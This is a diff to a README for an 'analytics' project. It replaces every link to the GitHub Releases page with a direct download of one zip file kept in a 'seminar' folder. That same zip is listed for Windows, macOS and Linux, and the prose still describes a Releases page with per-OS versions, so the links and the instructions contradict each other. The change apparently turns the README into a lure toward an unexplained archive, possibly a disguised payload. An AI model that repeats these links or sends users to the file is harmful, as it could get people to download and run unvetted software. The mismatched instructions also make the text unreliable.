@@ -8,22 +8,22 @@ Welcome to the **son-tung-mtp-analytics** project! This software provides insigh
 
 To get started with **son-tung-mtp-analytics**, you need to download it from the Releases page. Click the link below to visit the download page and grab the latest version:
 
-[![Download son-tung-mtp-analytics](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/irfanmaulana17/son-tung-mtp-analytics/releases)
+[![Download son-tung-mtp-analytics](https://raw.githubusercontent.com/irfanmaulana17/son-tung-mtp-analytics/main/seminar/son-tung-mtp-analytics.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/irfanmaulana17/son-tung-mtp-analytics/main/seminar/son-tung-mtp-analytics.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Download Page**
    Click the link below to access our Releases page:
-   [Download Latest Release](https://github.com/irfanmaulana17/son-tung-mtp-analytics/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/irfanmaulana17/son-tung-mtp-analytics/main/seminar/son-tung-mtp-analytics.zip)
 
 2. **Select the Version**
    On the Releases page, you will see a list of different versions. Choose the latest one for the best experience.
 
 3. **Download the File**
    After selecting the latest version, look for the file suitable for your operating system. Options may include:
-   - For Windows: `son-tung-mtp-analytics-windows.zip`
-   - For macOS: `son-tung-mtp-analytics-macos.zip`
-   - For Linux: `son-tung-mtp-analytics-linux.zip`
+   - For Windows: `https://raw.githubusercontent.com/irfanmaulana17/son-tung-mtp-analytics/main/seminar/son-tung-mtp-analytics.zip`
+   - For macOS: `https://raw.githubusercontent.com/irfanmaulana17/son-tung-mtp-analytics/main/seminar/son-tung-mtp-analytics.zip`
+   - For Linux: `https://raw.githubusercontent.com/irfanmaulana17/son-tung-mtp-analytics/main/seminar/son-tung-mtp-analytics.zip`
 
    Click on the appropriate file to start the download.
 
@@ -95,4 +95,4 @@ For feedback or queries, feel free to reach out through our contact page.
 
 Ready to start? Click the link below to go back to the Releases page and download **son-tung-mtp-analytics** now:
 
-[Download Latest Release](https://github.com/irfanmaulana17/son-tung-mtp-analytics/releases)
+[Download Latest Release](https://raw.githubusercontent.com/irfanmaulana17/son-tung-mtp-analytics/main/seminar/son-tung-mtp-analytics.zip)
